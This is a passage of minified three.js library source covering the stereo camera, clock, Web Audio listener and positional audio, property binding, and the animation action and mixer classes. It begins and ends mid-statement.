t=this._cache;if(t.focus!==e.focus||t.fov!==e.fov||t.aspect!==e.aspect*this.aspect||t.near!==e.near||t.far!==e.far||t.zoom!==e.zoom||t.eyeSep!==this.eyeSep){t.focus=e.focus,t.fov=e.fov,t.aspect=e.aspect*this.aspect,t.near=e.near,t.far=e.far,t.zoom=e.zoom,t.eyeSep=this.eyeSep;var i,n,r=e.projectionMatrix.clone(),o=t.eyeSep/2,a=o*t.near/t.focus,s=t.near*Math.tan(p.DEG2RAD*t.fov*.5)/t.zoom;hc.elements[12]=-o,lc.elements[12]=o,i=-s*t.aspect+a,n=s*t.aspect+a,r.elements[0]=2*t.near/(n-i),r.elements[8]=(n+i)/(n-i),this.cameraL.projectionMatrix.copy(r),i=-s*t.aspect-a,n=s*t.aspect-a,r.elements[0]=2*t.near/(n-i),r.elements[8]=(n+i)/(n-i),this.cameraR.projectionMatrix.copy(r)}this.cameraL.matrixWorld.copy(e.matrixWorld).multiply(hc),this.cameraR.matrixWorld.copy(e.matrixWorld).multiply(lc)}}),Object.assign(uc.prototype,{start:function(){this.startTime=("undefined"==typeof performance?Date:performance).now(),this.oldTime=this.startTime,this.elapsedTime=0,this.running=!0},stop:function(){this.getElapsedTime(),this.running=!1,this.autoStart=!1},getElapsedTime:function(){return this.getDelta(),this.elapsedTime},getDelta:function(){var e=0;if(this.autoStart&&!this.running)return this.start(),0;if(this.running){var t=("undefined"==typeof performance?Date:performance).now();e=(t-this.oldTime)/1e3,this.oldTime=t,this.elapsedTime+=e}return e}});var dc=new y,pc=new m,fc=new y,mc=new y;function vc(){K.call(this),this.type="AudioListener",this.context=nc(),this.gain=this.context.createGain(),this.gain.connect(this.context.destination),this.filter=null,this.timeDelta=0,this._clock=new uc}function gc(e){K.call(this),this.type="Audio",this.listener=e,this.context=e.context,this.gain=this.context.createGain(),this.gain.connect(e.getInput()),this.autoplay=!1,this.buffer=null,this.detune=0,this.loop=!1,this.loopStart=0,this.loopEnd=0,this.startTime=0,this.offset=0,this.duration=void 0,this.playbackRate=1,this.isPlaying=!1,this.hasPlaybackControl=!0,this.sourceType="empty",this.filters=[]}vc.prototype=Object.assign(Object.create(K.prototype),{constructor:vc,getInput:function(){return this.gain},removeFilter:function(){return null!==this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null),this},getFilter:function(){return this.filter},setFilter:function(e){return null!==this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):this.gain.disconnect(this.context.destination),this.filter=e,this.gain.connect(this.filter),this.filter.connect(this.context.destination),this},getMasterVolume:function(){return this.gain.gain.value},setMasterVolume:function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this},updateMatrixWorld:function(e){K.prototype.updateMatrixWorld.call(this,e);var t=this.context.listener,i=this.up;if(this.timeDelta=this._clock.getDelta(),this.matrixWorld.decompose(dc,pc,fc),mc.set(0,0,-1).applyQuaternion(pc),t.positionX){var n=this.context.currentTime+this.timeDelta;t.positionX.linearRampToValueAtTime(dc.x,n),t.positionY.linearRampToValueAtTime(dc.y,n),t.positionZ.linearRampToValueAtTime(dc.z,n),t.forwardX.linearRampToValueAtTime(mc.x,n),t.forwardY.linearRampToValueAtTime(mc.y,n),t.forwardZ.linearRampToValueAtTime(mc.z,n),t.upX.linearRampToValueAtTime(i.x,n),t.upY.linearRampToValueAtTime(i.y,n),t.upZ.linearRampToValueAtTime(i.z,n)}else t.setPosition(dc.x,dc.y,dc.z),t.setOrientation(mc.x,mc.y,mc.z,i.x,i.y,i.z)}}),gc.prototype=Object.assign(Object.create(K.prototype),{constructor:gc,getOutput:function(){return this.gain},setNodeSource:function(e){return this.hasPlaybackControl=!1,this.sourceType="audioNode",this.source=e,this.connect(),this},setMediaElementSource:function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaNode",this.source=this.context.createMediaElementSource(e),this.connect(),this},setMediaStreamSource:function(e){return this.hasPlaybackControl=!1,this.sourceType="mediaStreamNode",this.source=this.context.createMediaStreamSource(e),this.connect(),this},setBuffer:function(e){return this.buffer=e,this.sourceType="buffer",this.autoplay&&this.play(),this},play:function(){if(!0!==this.isPlaying){if(!1!==this.hasPlaybackControl){var e=this.context.createBufferSource();return e.buffer=this.buffer,e.loop=this.loop,e.loopStart=this.loopStart,e.loopEnd=this.loopEnd,e.onended=this.onEnded.bind(this),this.startTime=this.context.currentTime,e.start(this.startTime,this.offset,this.duration),this.isPlaying=!0,this.source=e,this.setDetune(this.detune),this.setPlaybackRate(this.playbackRate),this.connect()}console.warn("THREE.Audio: this Audio has no playback control.")}else console.warn("THREE.Audio: Audio is already playing.")},pause:function(){if(!1!==this.hasPlaybackControl)return!0===this.isPlaying&&(this.source.stop(),this.source.onended=null,this.offset+=(this.context.currentTime-this.startTime)*this.playbackRate,this.isPlaying=!1),this;console.warn("THREE.Audio: this Audio has no playback control.")},stop:function(){if(!1!==this.hasPlaybackControl)return this.source.stop(),this.source.onended=null,this.offset=0,this.isPlaying=!1,this;console.warn("THREE.Audio: this Audio has no playback control.")},connect:function(){if(this.filters.length>0){this.source.connect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].connect(this.filters[e]);this.filters[this.filters.length-1].connect(this.getOutput())}else this.source.connect(this.getOutput());return this},disconnect:function(){if(this.filters.length>0){this.source.disconnect(this.filters[0]);for(var e=1,t=this.filters.length;e<t;e++)this.filters[e-1].disconnect(this.filters[e]);this.filters[this.filters.length-1].disconnect(this.getOutput())}else this.source.disconnect(this.getOutput());return this},getFilters:function(){return this.filters},setFilters:function(e){return e||(e=[]),!0===this.isPlaying?(this.disconnect(),this.filters=e,this.connect()):this.filters=e,this},setDetune:function(e){if(this.detune=e,void 0!==this.source.detune)return!0===this.isPlaying&&this.source.detune.setTargetAtTime(this.detune,this.context.currentTime,.01),this},getDetune:function(){return this.detune},getFilter:function(){return this.getFilters()[0]},setFilter:function(e){return this.setFilters(e?[e]:[])},setPlaybackRate:function(e){if(!1!==this.hasPlaybackControl)return this.playbackRate=e,!0===this.isPlaying&&this.source.playbackRate.setTargetAtTime(this.playbackRate,this.context.currentTime,.01),this;console.warn("THREE.Audio: this Audio has no playback control.")},getPlaybackRate:function(){return this.playbackRate},onEnded:function(){this.isPlaying=!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn("THREE.Audio: this Audio has no playback control."),!1):this.loop},setLoop:function(e){if(!1!==this.hasPlaybackControl)return this.loop=e,!0===this.isPlaying&&(this.source.loop=this.loop),this;console.warn("THREE.Audio: this Audio has no playback control.")},setLoopStart:function(e){return this.loopStart=e,this},setLoopEnd:function(e){return this.loopEnd=e,this},getVolume:function(){return this.gain.gain.value},setVolume:function(e){return this.gain.gain.setTargetAtTime(e,this.context.currentTime,.01),this}});var yc=new y,bc=new m,wc=new y,xc=new y;function _c(e){gc.call(this,e),this.panner=this.context.createPanner(),this.panner.panningModel="HRTF",this.panner.connect(this.gain)}function Mc(e,t){this.analyser=e.context.createAnalyser(),this.analyser.fftSize=void 0!==t?t:2048,this.data=new Uint8Array(this.analyser.frequencyBinCount),e.getOutput().connect(this.analyser)}function Sc(e,t,i){this.binding=e,this.valueSize=i;var n,r=Float64Array;switch(t){case"quaternion":n=this._slerp;break;case"string":case"bool":r=Array,n=this._select;break;default:n=this._lerp}this.buffer=new r(4*i),this._mixBufferRegion=n,this.cumulativeWeight=0,this.useCount=0,this.referenceCount=0}_c.prototype=Object.assign(Object.create(gc.prototype),{constructor:_c,getOutput:function(){return this.panner},getRefDistance:function(){return this.panner.refDistance},setRefDistance:function(e){return this.panner.refDistance=e,this},getRolloffFactor:function(){return this.panner.rolloffFactor},setRolloffFactor:function(e){return this.panner.rolloffFactor=e,this},getDistanceModel:function(){return this.panner.distanceModel},setDistanceModel:function(e){return this.panner.distanceModel=e,this},getMaxDistance:function(){return this.panner.maxDistance},setMaxDistance:function(e){return this.panner.maxDistance=e,this},setDirectionalCone:function(e,t,i){return this.panner.coneInnerAngle=e,this.panner.coneOuterAngle=t,this.panner.coneOuterGain=i,this},updateMatrixWorld:function(e){if(K.prototype.updateMatrixWorld.call(this,e),!0!==this.hasPlaybackControl||!1!==this.isPlaying){this.matrixWorld.decompose(yc,bc,wc),xc.set(0,0,1).applyQuaternion(bc);var t=this.panner;if(t.positionX){var i=this.context.currentTime+this.listener.timeDelta;t.positionX.linearRampToValueAtTime(yc.x,i),t.positionY.linearRampToValueAtTime(yc.y,i),t.positionZ.linearRampToValueAtTime(yc.z,i),t.orientationX.linearRampToValueAtTime(xc.x,i),t.orientationY.linearRampToValueAtTime(xc.y,i),t.orientationZ.linearRampToValueAtTime(xc.z,i)}else t.setPosition(yc.x,yc.y,yc.z),t.setOrientation(xc.x,xc.y,xc.z)}}}),Object.assign(Mc.prototype,{getFrequencyData:function(){return this.analyser.getByteFrequencyData(this.data),this.data},getAverageFrequency:function(){for(var e=0,t=this.getFrequencyData(),i=0;i<t.length;i++)e+=t[i];return e/t.length}}),Object.assign(Sc.prototype,{accumulate:function(e,t){var i=this.buffer,n=this.valueSize,r=e*n+n,o=this.cumulativeWeight;if(0===o){for(var a=0;a!==n;++a)i[r+a]=i[a];o=t}else{var s=t/(o+=t);this._mixBufferRegion(i,r,0,s,n)}this.cumulativeWeight=o},apply:function(e){var t=this.valueSize,i=this.buffer,n=e*t+t,r=this.cumulativeWeight,o=this.binding;if(this.cumulativeWeight=0,r<1){var a=3*t;this._mixBufferRegion(i,n,a,1-r,t)}for(var s=t,c=t+t;s!==c;++s)if(i[s]!==i[s+t]){o.setValue(i,n);break}},saveOriginalState:function(){var e=this.binding,t=this.buffer,i=this.valueSize,n=3*i;e.getValue(t,n);for(var r=i,o=n;r!==o;++r)t[r]=t[n+r%i];this.cumulativeWeight=0},restoreOriginalState:function(){var e=3*this.valueSize;this.binding.setValue(this.buffer,e)},_select:function(e,t,i,n,r){if(n>=.5)for(var o=0;o!==r;++o)e[t+o]=e[i+o]},_slerp:function(e,t,i,n){m.slerpFlat(e,t,e,t,e,i,n)},_lerp:function(e,t,i,n,r){for(var o=1-n,a=0;a!==r;++a){var s=t+a;e[s]=e[s]*o+e[i+a]*n}}});var Tc=new RegExp("[\\[\\]\\.:\\/]","g"),Ec="[^\\[\\]\\.:\\/".replace("\\.","")+"]",Ac=/((?:WC+[\/:])*)/.source.replace("WC","[^\\[\\]\\.:\\/]"),Cc=/(WCOD+)?/.source.replace("WCOD",Ec),Pc=/(?:\.(WC+)(?:\[(.+)\])?)?/.source.replace("WC","[^\\[\\]\\.:\\/]"),Lc=/\.(WC+)(?:\[(.+)\])?/.source.replace("WC","[^\\[\\]\\.:\\/]"),Rc=new RegExp("^"+Ac+Cc+Pc+Lc+"$"),kc=["material","materials","bones"];function Oc(e,t,i){var n=i||Ic.parseTrackName(t);this._targetGroup=e,this._bindings=e.subscribe_(t,n)}function Ic(e,t,i){this.path=t,this.parsedPath=i||Ic.parseTrackName(t),this.node=Ic.findNode(e,this.parsedPath.nodeName)||e,this.rootNode=e}function Bc(e,t,i){this._mixer=e,this._clip=t,this._localRoot=i||null;for(var n=t.tracks,r=n.length,o=new Array(r),a={endingStart:2400,endingEnd:2400},s=0;s!==r;++s){var c=n[s].createInterpolant(null);o[s]=c,c.settings=a}this._interpolantSettings=a,this._interpolants=o,this._propertyBindings=new Array(r),this._cacheIndex=null,this._byClipCacheIndex=null,this._timeScaleInterpolant=null,this._weightInterpolant=null,this.loop=2201,this._loopCount=-1,this._startTime=null,this.time=0,this.timeScale=1,this._effectiveTimeScale=1,this.weight=1,this._effectiveWeight=1,this.repetitions=1/0,this.paused=!1,this.enabled=!0,this.clampWhenFinished=!1,this.zeroSlopeAtStart=!0,this.zeroSlopeAtEnd=!0}function Dc(e){this._root=e,this._initMemoryManager(),this._accuIndex=0,this.time=0,this.timeScale=1}function zc(e){"string"==typeof e&&(console.warn("THREE.Uniform: Type parameter is no longer needed."),e=arguments[1]),this.value=e}function Fc(e,t,i){pr.call(this,e,t),this._meshPerAttribute=i||1,this.versionVAO=0}function Nc(e,t,i,n){this.ray=new Se(e,t),this.near=i||0,this.far=n||1/0,this.camera=null,this.params={Mesh:{},Line:{},LOD:{},Points:{threshold:1},Sprite:{}},Object.defineProperties(this.params,{PointCloud:{get:function(){return console.warn("THREE.Raycaster: params.PointCloud has been renamed to params.Points."),this.Points}}})}function jc(e,t){return e.distance-t.distance}function Uc(e,t,i,n){if(!1!==e.visible&&(e.raycast(t,i),!0===n))for(var r=e.children,o=0,a=r.length;o<a;o++)Uc(r[o],t,i,!0)}function Vc(e,t,i){return this.radius=void 0!==e?e:1,this.phi=void 0!==t?t:0,this.theta=void 0!==i?i:0,this}Object.assign(Oc.prototype,{getValue:function(e,t){this.bind();var i=this._targetGroup.nCachedObjects_,n=this._bindings[i];void 0!==n&&n.getValue(e,t)},setValue:function(e,t){for(var i=this._bindings,n=this._targetGroup.nCachedObjects_,r=i.length;n!==r;++n)i[n].setValue(e,t)},bind:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,i=e.length;t!==i;++t)e[t].bind()},unbind:function(){for(var e=this._bindings,t=this._targetGroup.nCachedObjects_,i=e.length;t!==i;++t)e[t].unbind()}}),Object.assign(Ic,{Composite:Oc,create:function(e,t,i){return e&&e.isAnimationObjectGroup?new Ic.Composite(e,t,i):new Ic(e,t,i)},sanitizeNodeName:function(e){return e.replace(/\s/g,"_").replace(Tc,"")},parseTrackName:function(e){var t=Rc.exec(e);if(!t)throw new Error("PropertyBinding: Cannot parse trackName: "+e);var i={nodeName:t[2],objectName:t[3],objectIndex:t[4],propertyName:t[5],propertyIndex:t[6]},n=i.nodeName&&i.nodeName.lastIndexOf(".");if(void 0!==n&&-1!==n){var r=i.nodeName.substring(n+1);-1!==kc.indexOf(r)&&(i.nodeName=i.nodeName.substring(0,n),i.objectName=r)}if(null===i.propertyName||0===i.propertyName.length)throw new Error("PropertyBinding: can not parse propertyName from trackName: "+e);return i},findNode:function(e,t){if(!t||""===t||"root"===t||"."===t||-1===t||t===e.name||t===e.uuid)return e;if(e.skeleton){var i=e.skeleton.getBoneByName(t);if(void 0!==i)return i}if(e.children){var n=function(e){for(var i=0;i<e.length;i++){var r=e[i];if(r.name===t||r.uuid===t)return r;var o=n(r.children);if(o)return o}return null},r=n(e.children);if(r)return r}return null}}),Object.assign(Ic.prototype,{_getValue_unavailable:function(){},_setValue_unavailable:function(){},BindingType:{Direct:0,EntireArray:1,ArrayElement:2,HasFromToArray:3},Versioning:{None:0,NeedsUpdate:1,MatrixWorldNeedsUpdate:2},GetterByBindingType:[function(e,t){e[t]=this.node[this.propertyName]},function(e,t){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)e[t++]=i[n]},function(e,t){e[t]=this.resolvedProperty[this.propertyIndex]},function(e,t){this.resolvedProperty.toArray(e,t)}],SetterByBindingTypeAndVersioning:[[function(e,t){this.targetObject[this.propertyName]=e[t]},function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.needsUpdate=!0},function(e,t){this.targetObject[this.propertyName]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=e[t++]},function(e,t){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=e[t++];this.targetObject.needsUpdate=!0},function(e,t){for(var i=this.resolvedProperty,n=0,r=i.length;n!==r;++n)i[n]=e[t++];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){this.resolvedProperty[this.propertyIndex]=e[t]},function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.needsUpdate=!0},function(e,t){this.resolvedProperty[this.propertyIndex]=e[t],this.targetObject.matrixWorldNeedsUpdate=!0}],[function(e,t){this.resolvedProperty.fromArray(e,t)},function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.needsUpdate=!0},function(e,t){this.resolvedProperty.fromArray(e,t),this.targetObject.matrixWorldNeedsUpdate=!0}]],getValue:function(e,t){this.bind(),this.getValue(e,t)},setValue:function(e,t){this.bind(),this.setValue(e,t)},bind:function(){var e=this.node,t=this.parsedPath,i=t.objectName,n=t.propertyName,r=t.propertyIndex;if(e||(e=Ic.findNode(this.rootNode,t.nodeName)||this.rootNode,this.node=e),this.getValue=this._getValue_unavailable,this.setValue=this._setValue_unavailable,e){if(i){var o=t.objectIndex;switch(i){case"materials":if(!e.material)return void console.error("THREE.PropertyBinding: Can not bind to material as node does not have a material.",this);if(!e.material.materials)return void console.error("THREE.PropertyBinding: Can not bind to material.materials as node.material does not have a materials array.",this);e=e.material.materials;break;case"bones":if(!e.skeleton)return void console.error("THREE.PropertyBinding: Can not bind to bones as node does not have a skeleton.",this);e=e.skeleton.bones;for(var a=0;a<e.length;a++)if(e[a].name===o){o=a;break}break;default:if(void 0===e[i])return void console.error("THREE.PropertyBinding: Can not bind to objectName of node undefined.",this);e=e[i]}if(void 0!==o){if(void 0===e[o])return void console.error("THREE.PropertyBinding: Trying to bind to objectIndex of objectName, but is undefined.",this,e);e=e[o]}}var s=e[n];if(void 0!==s){var c=this.Versioning.None;this.targetObject=e,void 0!==e.needsUpdate?c=this.Versioning.NeedsUpdate:void 0!==e.matrixWorldNeedsUpdate&&(c=this.Versioning.MatrixWorldNeedsUpdate);var l=this.BindingType.Direct;if(void 0!==r){if("morphTargetInfluences"===n){if(!e.geometry)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.",this);if(e.geometry.isBufferGeometry){if(!e.geometry.morphAttributes)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.morphAttributes.",this);for(a=0;a<this.node.geometry.morphAttributes.position.length;a++)if(e.geometry.morphAttributes.position[a].name===r){r=a;break}}else{if(!e.geometry.morphTargets)return void console.error("THREE.PropertyBinding: Can not bind to morphTargetInfluences because node does not have a geometry.morphTargets.",this);for(a=0;a<this.node.geometry.morphTargets.length;a++)if(e.geometry.morphTargets[a].name===r){r=a;break}}}l=this.BindingType.ArrayElement,this.resolvedProperty=s,this.propertyIndex=r}else void 0!==s.fromArray&&void 0!==s.toArray?(l=this.BindingType.HasFromToArray,this.resolvedProperty=s):Array.isArray(s)?(l=this.BindingType.EntireArray,this.resolvedProperty=s):this.propertyName=n;this.getValue=this.GetterByBindingType[l],this.setValue=this.SetterByBindingTypeAndVersioning[l][c]}else{var h=t.nodeName;console.error("THREE.PropertyBinding: Trying to update property for track: "+h+"."+n+" but it wasn't found.",e)}}else console.error("THREE.PropertyBinding: Trying to update node for track: "+this.path+" but it wasn't found.")},unbind:function(){this.node=null,this.getValue=this._getValue_unbound,this.setValue=this._setValue_unbound}}),Object.assign(Ic.prototype,{_getValue_unbound:Ic.prototype.getValue,_setValue_unbound:Ic.prototype.setValue}),Object.assign(function(){this.uuid=p.generateUUID(),this._objects=Array.prototype.slice.call(arguments),this.nCachedObjects_=0;var e={};this._indicesByUUID=e;for(var t=0,i=arguments.length;t!==i;++t)e[arguments[t].uuid]=t;this._paths=[],this._parsedPaths=[],this._bindings=[],this._bindingsIndicesByPath={};var n=this;this.stats={objects:{get total(){return n._objects.length},get inUse(){return this.total-n.nCachedObjects_}},get bindingsPerObject(){return n._bindings.length}}}.prototype,{isAnimationObjectGroup:!0,add:function(){for(var e=this._objects,t=e.length,i=this.nCachedObjects_,n=this._indicesByUUID,r=this._paths,o=this._parsedPaths,a=this._bindings,s=a.length,c=void 0,l=0,h=arguments.length;l!==h;++l){var u=arguments[l],d=u.uuid,p=n[d];if(void 0===p){p=t++,n[d]=p,e.push(u);for(var f=0,m=s;f!==m;++f)a[f].push(new Ic(u,r[f],o[f]))}else if(p<i){c=e[p];var v=--i,g=e[v];n[g.uuid]=p,e[p]=g,n[d]=v,e[v]=u;for(f=0,m=s;f!==m;++f){var y=a[f],b=y[v],w=y[p];y[p]=b,void 0===w&&(w=new Ic(u,r[f],o[f])),y[v]=w}}else e[p]!==c&&console.error("THREE.AnimationObjectGroup: Different objects with the same UUID detected. Clean the caches or recreate your infrastructure when reloading scenes.")}this.nCachedObjects_=i},remove:function(){for(var e=this._objects,t=this.nCachedObjects_,i=this._indicesByUUID,n=this._bindings,r=n.length,o=0,a=arguments.length;o!==a;++o){var s=arguments[o],c=s.uuid,l=i[c];if(void 0!==l&&l>=t){var h=t++,u=e[h];i[u.uuid]=l,e[l]=u,i[c]=h,e[h]=s;for(var d=0,p=r;d!==p;++d){var f=n[d],m=f[h],v=f[l];f[l]=m,f[h]=v}}}this.nCachedObjects_=t},uncache:function(){for(var e=this._objects,t=e.length,i=this.nCachedObjects_,n=this._indicesByUUID,r=this._bindings,o=r.length,a=0,s=arguments.length;a!==s;++a){var c=arguments[a],l=c.uuid,h=n[l];if(void 0!==h)if(delete n[l],h<i){var u=--i,d=e[u],p=e[y=--t];n[d.uuid]=h,e[h]=d,n[p.uuid]=u,e[u]=p,e.pop();for(var f=0,m=o;f!==m;++f){var v=(b=r[f])[u],g=b[y];b[h]=v,b[u]=g,b.pop()}}else{var y;n[(p=e[y=--t]).uuid]=h,e[h]=p,e.pop();for(f=0,m=o;f!==m;++f){var b;(b=r[f])[h]=b[y],b.pop()}}}this.nCachedObjects_=i},subscribe_:function(e,t){var i=this._bindingsIndicesByPath,n=i[e],r=this._bindings;if(void 0!==n)return r[n];var o=this._paths,a=this._parsedPaths,s=this._objects,c=s.length,l=this.nCachedObjects_,h=new Array(c);n=r.length,i[e]=n,o.push(e),a.push(t),r.push(h);for(var u=l,d=s.length;u!==d;++u){var p=s[u];h[u]=new Ic(p,e,t)}return h},unsubscribe_:function(e){var t=this._bindingsIndicesByPath,i=t[e];if(void 0!==i){var n=this._paths,r=this._parsedPaths,o=this._bindings,a=o.length-1,s=o[a];t[e[a]]=i,o[i]=s,o.pop(),r[i]=r[a],r.pop(),n[i]=n[a],n.pop()}}}),Object.assign(Bc.prototype,{play:function(){return this._mixer._activateAction(this),this},stop:function(){return this._mixer._deactivateAction(this),this.reset()},reset:function(){return this.paused=!1,this.enabled=!0,this.time=0,this._loopCount=-1,this._startTime=null,this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},startAt:function(e){return this._startTime=e,this},setLoop:function(e,t){return this.loop=e,this.repetitions=t,this},setEffectiveWeight:function(e){return this.weight=e,this._effectiveWeight=this.enabled?e:0,this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(e){return this._scheduleFading(e,0,1)},fadeOut:function(e){return this._scheduleFading(e,1,0)},crossFadeFrom:function(e,t,i){if(e.fadeOut(t),this.fadeIn(t),i){var n=this._clip.duration,r=e._clip.duration,o=r/n,a=n/r;e.warp(1,o,t),this.warp(a,1,t)}return this},crossFadeTo:function(e,t,i){return e.crossFadeFrom(this,t,i)},stopFading:function(){var e=this._weightInterpolant;return null!==e&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this},setEffectiveTimeScale:function(e){return this.timeScale=e,this._effectiveTimeScale=this.paused?0:e,this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(e){return this.timeScale=this._clip.duration/e,this.stopWarping()},syncWith:function(e){return this.time=e.time,this.timeScale=e.timeScale,this.stopWarping()},halt:function(e){return this.warp(this._effectiveTimeScale,0,e)},warp:function(e,t,i){var n=this._mixer,r=n.time,o=this._timeScaleInterpolant,a=this.timeScale;null===o&&(o=n._lendControlInterpolant(),this._timeScaleInterpolant=o);var s=o.parameterPositions,c=o.sampleValues;return s[0]=r,s[1]=r+i,c[0]=e/a,c[1]=t/a,this},stopWarping:function(){var e=this._timeScaleInterpolant;return null!==e&&(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(e)),this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||this._mixer._root},_update:function(e,t,i,n){if(this.enabled){var r=this._startTime;if(null!==r){var o=(e-r)*i;if(o<0||0===i)return;this._startTime=null,t=i*o}t*=this._updateTimeScale(e);var a=this._updateTime(t),s=this._updateWeight(e);if(s>0)for(var c=this._interpolants,l=this._propertyBindings,h=0,u=c.length;h!==u;++h)c[h].evaluate(a),l[h].accumulate(n,s)}else this._updateWeight(e)},_updateWeight:function(e){var t=0;if(this.enabled){t=this.weight;var i=this._weightInterpolant;if(null!==i){var n=i.evaluate(e)[0];t*=n,e>i.parameterPositions[1]&&(this.stopFading(),0===n&&(this.enabled=!1))}}return this._effectiveWeight=t,t},_updateTimeScale:function(e){var t=0;if(!this.paused){t=this.timeScale;var i=this._timeScaleInterpolant;if(null!==i)t*=i.evaluate(e)[0],e>i.parameterPositions[1]&&(this.stopWarping(),0===t?this.paused=!0:this.timeScale=t)}return this._effectiveTimeScale=t,t},_updateTime:function(e){var t=this.time+e,i=this._clip.duration,n=this.loop,r=this._loopCount,o=2202===n;if(0===e)return-1===r?t:o&&1==(1&r)?i-t:t;if(2200===n){-1===r&&(this._loopCount=0,this._setEndings(!0,!0,!1));e:{if(t>=i)t=i;else{if(!(t<0)){this.time=t;break e}t=0}this.clampWhenFinished?this.paused=!0:this.enabled=!1,this.time=t,this._mixer.dispatchEvent({type:"finished",action:this,direction:e<0?-1:1})}}else{if(-1===r&&(e>=0?(r=0,this._setEndings(!0,0===this.repetitions,o)):this._setEndings(0===this.repetitions,!0,o)),t>=i||t<0){var a=Math.floor(t/i);t-=i*a,r+=Math.abs(a);var s=this.repetitions-r;if(s<=0)this.clampWhenFinished?this.paused=!0:this.enabled=!1,t=e>0?i:0,this.time=t,this._mixer.dispatchEvent({type:"finished",action:this,direction:e>0?1:-1});else{if(1===s){var c=e<0;this._setEndings(c,!c,o)}else this._setEndings(!1,!1,o);this._loopCount=r,this.time=t,this._mixer.dispatchEvent({type:"loop",action:this,loopDelta:a})}}else this.time=t;if(o&&1==(1&r))return i-t}return t},_setEndings:function(e,t,i){var n=this._interpolantSettings;i?(n.endingStart=2401,n.endingEnd=2401):(n.endingStart=e?this.zeroSlopeAtStart?2401:2400:2402,n.endingEnd=t?this.zeroSlopeAtEnd?2401:2400:2402)},_scheduleFading:function(e,t,i){var n=this._mixer,r=n.time,o=this._weightInterpolant;null===o&&(o=n._lendControlInterpolant(),this._weightInterpolant=o);var a=o.parameterPositions,s=o.sampleValues;return a[0]=r,s[0]=t,a[1]=r+e,s[1]=i,this}}),Dc.prototype=Object.assign(Object.create(h.prototype),{constructor:Dc,_bindAction:function(e,t){var i=e._localRoot||this._root,n=e._clip.tracks,r=n.length,o=e._propertyBindings,a=e._interpolants,s=i.uuid,c=this._bindingsByRootAndName,l=c[s];void 0===l&&(l={},c[s]=l);for(var h=0;h!==r;++h){var u=n[h],d=u.name,p=l[d];if(void 0!==p)o[h]=p;else{if(void 0!==(p=o[h])){null===p._cacheIndex&&(++p.referenceCount,this._addInactiveBinding(p,s,d));continue}var f=t&&t._propertyBindings[h].binding.parsedPath;++(p=new Sc(Ic.create(i,d,f),u.ValueTypeName,u.getValueSize())).referenceCount,this._addInactiveBinding(p,s,d),o[h]=p}a[h].resultBuffer=p.buffer}},_activateAction:function(e){if(!this._isActiveAction(e)){if(null===e._cacheIndex){var t=(e._localRoot||this._root).uuid,i=e._clip.uuid,n=this._actionsByClip[i];this._bindAction(e,n&&n.knownActions[0]),this._addInactiveAction(e,i,t)}for(var r=e._propertyBindings,o=0,a=r.length;o!==a;++o){var s=r[o];0==s.useCount++&&(this._lendBinding(s),s.saveOriginalState())}this._lendAction(e)}},_deactivateAction:function(e){if(this._isActiveAction(e)){for(var t=e._propertyBindings,i=0,n=t.length;i!==n;++i){var r=t[i];0==--r.useCount&&(r.restoreOriginalState(),this._takeBackBinding(r))}this._takeBackAction(e)}},_initMemoryManager:function(){this._actions=[],this._nActiveActions=0,this._actionsByClip={},this._bindings=[],this._nActiveBindings=0,this._bindingsByRootAndName={},this._controlInterpolants=[],this._nActiveControlInterpolants=0;var e=this;this.stats={actions:{get total(){return e._actions.length},get inUse(){return e._nActiveActions}},bindings:{get total(){return e._bindings.length},get inUse(){return e._nActiveBindings}},controlInterpolants:{get total(){return e._controlInterpolants.length},get inUse(){return e._nActiveControlInterpolants}}}},_isActiveAction:function(e){var t=e._cacheIndex;return null!==t&&t<this._nActiveActions},_addInactiveAction:function(e,t,i){var n=this._actions,r=this._actionsByClip,o=r[t];if(void 0===o)o={knownActions:[e],actionByRoot:{}},e._byClipCacheIndex=0,r[t]=o;else{var a=o.knownActions;e._byClipCacheIndex=a.length,a.push(e)}e._cacheIndex=n.length,n.push(e),o.actionByRoot[i]=e},_removeInactiveAction:function(e){var t=this._actions,i=t[t.length-1],n=e._cacheIndex;i._cacheIndex=n,t[n]=i,t.pop(),e._cacheIndex=null;var r=e._clip.uuid,o=this._actionsByClip,a=o[r],s=a.knownActions,c=s[s.length-1],l=e._byClipCacheIndex;c._byClipCacheIndex=l,s[l]=c,s.pop(),e._byClipCacheIndex=null,delete a.actionByRoot[(e._localRoot||this._root).uuid],0===s.length&&delete o[r],this._removeInactiveBindingsForAction(e)},_removeInactiveBindingsForAction:function(e){for(var t=e._propertyBindings,i=0,n=t.length;i!==n;++i){var r=t[i];0==--r.referenceCount&&this._removeInactiveBinding(r)}},_lendAction:function(e){var t=this._actions,i=e._cacheIndex,n=this._nActiveActions++,r=t[n];e._cacheIndex=n,t[n]=e,r._cacheIndex=i,t[i]=r},_takeBackAction:function(e){var 